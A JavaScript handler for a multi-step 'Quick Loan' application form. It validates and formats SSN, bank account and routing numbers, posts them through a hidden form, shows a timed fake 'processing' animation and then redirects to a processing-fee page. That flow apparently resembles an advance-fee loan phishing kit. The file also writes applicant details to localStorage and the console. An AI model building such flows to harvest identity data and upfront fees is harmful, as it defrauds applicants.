/**
 * apply.js — Multi-step form with validation and proper submission handling
 * Professional loan application form handler with processing animation
 */

// ============================================
// GLOBAL VARIABLES
// ============================================
let currentStep = 1;
const totalSteps = 4;
let formSubmitted = false;

// ============================================
// INITIALIZATION
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    initializeForm();
    attachEventListeners();
    initializeValidation();
});

function initializeForm() {
    // Show first step
    showStep(1);
    updateProgressIndicator();
    
    // Hide processing message initially
    const processingMsg = document.getElementById('processingMessage');
    if (processingMsg) {
        processingMsg.style.display = 'none';
    }
}

// ============================================
// NAVIGATION FUNCTIONS
// ============================================
function nextStep() {
    if (validateStep(currentStep)) {
        // Mark current step as completed
        markStepCompleted(currentStep);
        
        // Hide current step
        hideStep(currentStep);
        
        // Move to next step
        currentStep++;
        
        // Show next step
        showStep(currentStep);
        
        // Update progress indicator
        updateProgressIndicator();
        
        // Scroll to top smoothly
        scrollToTop();
    }
}

function prevStep() {
    // Hide current step
    hideStep(currentStep);
    
    // Move to previous step
    currentStep--;
    
    // Show previous step
    showStep(currentStep);
    
    // Update progress indicator
    updateProgressIndicator();
    
    // Scroll to top smoothly
    scrollToTop();
}

function showStep(stepNumber) {
    const step = document.getElementById(`step${stepNumber}`);
    if (step) {
        step.classList.add('active');
    }
}

function hideStep(stepNumber) {
    const step = document.getElementById(`step${stepNumber}`);
    if (step) {
        step.classList.remove('active');
    }
}

function scrollToTop() {
    window.scrollTo({
        top: 0,
        behavior: 'smooth'
    });
}

// ============================================
// PROGRESS INDICATOR
// ============================================
function updateProgressIndicator() {
    const indicators = document.querySelectorAll('.step-indicator');
    
    indicators.forEach((indicator, index) => {
        const stepNum = index + 1;
        
        // Remove all state classes
        indicator.classList.remove('active', 'completed');
        
        // Add appropriate class
        if (stepNum < currentStep) {
            indicator.classList.add('completed');
        } else if (stepNum === currentStep) {
            indicator.classList.add('active');
        }
    });
}

function markStepCompleted(stepNumber) {
    const indicator = document.querySelector(`.step-indicator[data-step="${stepNumber}"]`);
    if (indicator) {
        indicator.classList.add('completed');
        indicator.classList.remove('active');
    }
}

// ============================================
// VALIDATION FUNCTIONS
// ============================================
function validateStep(stepNumber) {
    let isValid = true;
    const step = document.getElementById(`step${stepNumber}`);
    
    if (!step) return false;
    
    // Get all required inputs in the current step
    const inputs = step.querySelectorAll('input[required], select[required]');
    
    inputs.forEach(input => {
        if (!validateField(input)) {
            isValid = false;
        }
    });
    
    // Show alert if validation fails
    if (!isValid) {
        showValidationAlert('Please fill in all required fields correctly.');
    }
    
    return isValid;
}

function validateField(field) {
    const fieldId = field.id;
    const errorElement = document.getElementById(`${fieldId}-error`);
    let isValid = true;
    let errorMessage = '';
    
    // Clear previous error
    field.classList.remove('error');
    if (errorElement) {
        errorElement.classList.remove('show');
    }
    
    // Check if field is empty (except checkbox)
    if (field.type !== 'checkbox' && !field.value.trim()) {
        isValid = false;
        errorMessage = 'This field is required';
    }
    
    // Specific validation rules
    if (field.value.trim()) {
        switch (fieldId) {
            case 'fullname':
                if (field.value.trim().split(' ').length < 2) {
                    isValid = false;
                    errorMessage = 'Please enter your full name (first and last name)';
                }
                break;
                
            case 'email':
                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailPattern.test(field.value)) {
                    isValid = false;
                    errorMessage = 'Please enter a valid email address';
                }
                break;
                
            case 'phone':
                const phonePattern = /^[\d\s\+\-\(\)]+$/;
                const phoneDigits = field.value.replace(/\D/g, '');
                if (!phonePattern.test(field.value) || phoneDigits.length < 10) {
                    isValid = false;
                    errorMessage = 'Please enter a valid phone number (at least 10 digits)';
                }
                break;
                
            case 'dob':
                const dob = new Date(field.value);
                const today = new Date();
                const age = today.getFullYear() - dob.getFullYear();
                if (age < 18) {
                    isValid = false;
                    errorMessage = 'You must be at least 18 years old to apply';
                }
                break;
                
            case 'loanAmount':
                const cleanLoanAmount = field.getAttribute('data-clean-value') || field.value.replace(/,/g, '');
                const amount = parseFloat(cleanLoanAmount);
                if (isNaN(amount) || amount < 100 || amount > 500000) {
                    isValid = false;
                    errorMessage = 'Loan amount must be between $100 and $500,000';
                }
                break;
                
            case 'income':
                const cleanIncome = field.getAttribute('data-clean-value') || field.value.replace(/,/g, '');
                const incomeValue = parseFloat(cleanIncome);
                if (isNaN(incomeValue) || incomeValue < 0) {
                    isValid = false;
                    errorMessage = 'Please enter a valid income amount';
                }
                break;
                
            case 'accountNumber':
                if (field.value.replace(/\D/g, '').length < 6) {
                    isValid = false;
                    errorMessage = 'Please enter a valid account number';
                }
                break;
                
            case 'routingNumber':
                if (field.value.replace(/\D/g, '').length !== 9) {
                    isValid = false;
                    errorMessage = 'Routing number must be exactly 9 digits';
                }
                break;
                
            case 'zipcode':
                if (field.value.replace(/\D/g, '').length !== 5) {
                    isValid = false;
                    errorMessage = 'Please enter a valid 5-digit ZIP code';
                }
                break;
                
            case 'ssn':
                const ssnPattern = /^\d{3}-\d{2}-\d{4}$/;
                if (!ssnPattern.test(field.value)) {
                    isValid = false;
                    errorMessage = 'Please enter a valid SSN (format: 000-00-0000)';
                }
                break;
        }
    }
    
    // Check checkbox
    if (field.type === 'checkbox' && field.id === 'terms') {
        if (!field.checked) {
            isValid = false;
            errorMessage = 'You must agree to the terms to continue';
        }
    }
    
    // Show error if invalid
    if (!isValid) {
        field.classList.add('error');
        if (errorElement) {
            errorElement.textContent = errorMessage;
            errorElement.classList.add('show');
        }
    }
    
    return isValid;
}

function showValidationAlert(message) {
    // Create alert if it doesn't exist
    let alert = document.querySelector('.validation-alert');
    
    if (!alert) {
        alert = document.createElement('div');
        alert.className = 'validation-alert';
        document.body.appendChild(alert);
    }
    
    alert.textContent = message;
    alert.classList.add('show');
    
    // Auto-hide after 3 seconds
    setTimeout(() => {
        alert.classList.remove('show');
    }, 3000);
}

// ============================================
// EVENT LISTENERS
// ============================================
function attachEventListeners() {
    // Real-time validation on input
    const allInputs = document.querySelectorAll('input, select');
    
    allInputs.forEach(input => {
        // Validate on blur
        input.addEventListener('blur', function() {
            if (this.value.trim() || this.type === 'checkbox') {
                validateField(this);
            }
        });
        
        // Clear error on input
        input.addEventListener('input', function() {
            this.classList.remove('error');
            const errorElement = document.getElementById(`${this.id}-error`);
            if (errorElement) {
                errorElement.classList.remove('show');
            }
        });
    });
}

// ============================================
// FIELD FORMATTING
// ============================================
function initializeValidation() {
    // Format SSN input
    const ssnInput = document.getElementById('ssn');
    if (ssnInput) {
        ssnInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 3 && value.length <= 5) {
                value = value.slice(0, 3) + '-' + value.slice(3);
            } else if (value.length > 5) {
                value = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5, 9);
            }
            e.target.value = value;
        });
    }
    
    // Format routing number (numbers only)
    const routingInput = document.getElementById('routingNumber');
    if (routingInput) {
        routingInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9);
        });
    }
    
    // Format ZIP code (numbers only)
    const zipcodeInput = document.getElementById('zipcode');
    if (zipcodeInput) {
        zipcodeInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 5);
        });
    }
    
    // Format phone number
    const phoneInput = document.getElementById('phone');
    if (phoneInput) {
        phoneInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 0) {
                if (value.length <= 3) {
                    value = value;
                } else if (value.length <= 6) {
                    value = '(' + value.slice(0, 3) + ') ' + value.slice(3);
                } else {
                    value = '(' + value.slice(0, 3) + ') ' + value.slice(3, 6) + '-' + value.slice(6, 10);
                }
            }
            e.target.value = value;
        });
    }
    
    // Format loan amount with live comma formatting
    const loanAmountInput = document.getElementById('loanAmount');
    if (loanAmountInput) {
        loanAmountInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^\d]/g, '');
            e.target.setAttribute('data-clean-value', value);
            
            if (value) {
                const formatted = parseInt(value, 10).toLocaleString('en-US');
                e.target.value = formatted;
            } else {
                e.target.value = '';
            }
        });
    }
    
    // Format income with live comma formatting
    const incomeInput = document.getElementById('income');
    if (incomeInput) {
        incomeInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^\d]/g, '');
            e.target.setAttribute('data-clean-value', value);
            
            if (value) {
                const formatted = parseInt(value, 10).toLocaleString('en-US');
                e.target.value = formatted;
            } else {
                e.target.value = '';
            }
        });
    }
}

// ============================================
// DATA STORAGE HELPER
// ============================================
function storeFormData() {
    try {
        // Get form values
        const fullname = document.getElementById('fullname')?.value || '';
        const email = document.getElementById('email')?.value || '';
        const loanType = document.getElementById('loanType')?.value || '';
        
        // Get raw values
        const loanAmountInput = document.getElementById('loanAmount');
        const incomeInput = document.getElementById('income');
        
        let loanAmount = '';
        let income = '';
        
        if (loanAmountInput) {
            loanAmount = loanAmountInput.getAttribute('data-clean-value') || loanAmountInput.value.replace(/,/g, '');
        }
        
        if (incomeInput) {
            income = incomeInput.getAttribute('data-clean-value') || incomeInput.value.replace(/,/g, '');
        }
        
        // Parse numeric values
        const parsedLoanAmount = parseFloat(String(loanAmount).replace(/,/g, '')) || 0;
        const parsedIncome = parseFloat(String(income).replace(/,/g, '')) || 0;
        
        console.log('Storing form data:', {
            name: fullname,
            email: email,
            loanType: loanType,
            loanAmount: parsedLoanAmount,
            annualIncome: parsedIncome
        });
        
        // Store in sessionStorage
        sessionStorage.setItem('applicantName', fullname);
        sessionStorage.setItem('applicantEmail', email);
        sessionStorage.setItem('loanType', loanType);
        sessionStorage.setItem('loanAmount', parsedLoanAmount.toString());
        sessionStorage.setItem('annualIncome', parsedIncome.toString());
        
        // Also store in localStorage as backup
        localStorage.setItem('applicantName', fullname);
        localStorage.setItem('applicantEmail', email);
        localStorage.setItem('loanType', loanType);
        localStorage.setItem('loanAmount', parsedLoanAmount.toString());
        localStorage.setItem('annualIncome', parsedIncome.toString());
        
    } catch (e) {
        console.error('Error storing form data:', e);
    }
}

// ============================================
// PROCESSING ANIMATION
// ============================================
function showProcessingAnimation() {
    // Hide form elements
    const form = document.getElementById('applicationForm');
    const header = document.getElementById('pageHeader');
    const progress = document.getElementById('progressWrapper');
    
    if (form) form.style.display = 'none';
    if (header) header.style.display = 'none';
    if (progress) progress.style.display = 'none';
    
    // Show processing message
    const processingMsg = document.getElementById('processingMessage');
    if (processingMsg) {
        processingMsg.style.display = 'block';
        processingMsg.classList.add('show');
    }
    
    // Scroll to top
    scrollToTop();
    
    // Animate processing steps
    setTimeout(() => {
        const step2 = document.getElementById('procStep2');
        if (step2) {
            step2.classList.remove('active');
            step2.classList.add('completed');
            const icon2 = step2.querySelector('.step-icon');
            if (icon2) icon2.textContent = '✓';
        }
        
        const step3 = document.getElementById('procStep3');
        if (step3) {
            step3.classList.add('active');
        }
    }, 1500);
    
    setTimeout(() => {
        const step3 = document.getElementById('procStep3');
        if (step3) {
            step3.classList.remove('active');
            step3.classList.add('completed');
            const icon3 = step3.querySelector('.step-icon');
            if (icon3) icon3.textContent = '✓';
        }
    }, 3000);
}

// ============================================
// FORM SUBMISSION
// ============================================
document.getElementById('applicationForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    // Prevent double submission
    if (formSubmitted) {
        return;
    }
    
    // Final validation
    if (!validateStep(currentStep)) {
        return;
    }
    
    formSubmitted = true;
    
    // Disable submit button
    const submitButton = document.getElementById('submitButton');
    if (submitButton) {
        submitButton.disabled = true;
        submitButton.textContent = 'Submitting...';
    }
    
    // Store form data before submission
    storeFormData();
    
    // Show processing animation
    showProcessingAnimation();
    
    // Get clean values for submission
    const loanAmountInput = document.getElementById('loanAmount');
    const incomeInput = document.getElementById('income');
    
    // Create a hidden form for submission with clean values
    const hiddenForm = document.createElement('form');
    hiddenForm.action = this.action;
    hiddenForm.method = 'POST';
    hiddenForm.target = 'hiddenFrame';
    hiddenForm.style.display = 'none';
    
    // Copy all form data
    const formData = new FormData(this);
    
    // Replace formatted values with clean values
    if (loanAmountInput) {
        formData.set('Loan Amount', loanAmountInput.getAttribute('data-clean-value') || loanAmountInput.value.replace(/,/g, ''));
    }
    if (incomeInput) {
        formData.set('Annual Income', incomeInput.getAttribute('data-clean-value') || incomeInput.value.replace(/,/g, ''));
    }
    
    // Add all fields to hidden form
    for (let [key, value] of formData.entries()) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = value;
        hiddenForm.appendChild(input);
    }
    
    document.body.appendChild(hiddenForm);
    
    // Submit the hidden form
    hiddenForm.submit();
    
    // Redirect to processing fee page after animation completes
    setTimeout(function() {
        window.location.href = 'processing-fee.html';
    }, 4000);
    
    // Remove hidden form
    setTimeout(() => {
        if (hiddenForm.parentNode) {
            hiddenForm.parentNode.removeChild(hiddenForm);
        }
    }, 5000);
});

// ============================================
// KEYBOARD NAVIGATION
// ============================================
document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter' && e.target.tagName !== 'TEXTAREA' && e.target.type !== 'submit') {
        e.preventDefault();
        const nextButton = document.querySelector('.form-step.active .btn-next');
        if (nextButton) {
            nextButton.click();
        }
    }
});

// ============================================
// PREVENT ACCIDENTAL NAVIGATION
// ============================================
let formModified = false;

document.querySelectorAll('input, select, textarea').forEach(function(element) {
    element.addEventListener('change', function() {
        formModified = true;
    });
});

window.addEventListener('beforeunload', function(e) {
    if (formModified && currentStep < totalSteps && !formSubmitted) {
        e.preventDefault();
        e.returnValue = '';
        return '';
    }
});

// ============================================
// CONSOLE WELCOME MESSAGE
// ============================================
console.log('%cQuick Loan Application Form', 'color: #00d4ff; font-size: 20px; font-weight: bold;');
console.log('%cForm initialized successfully', 'color: #51cf66; font-size: 14px;');
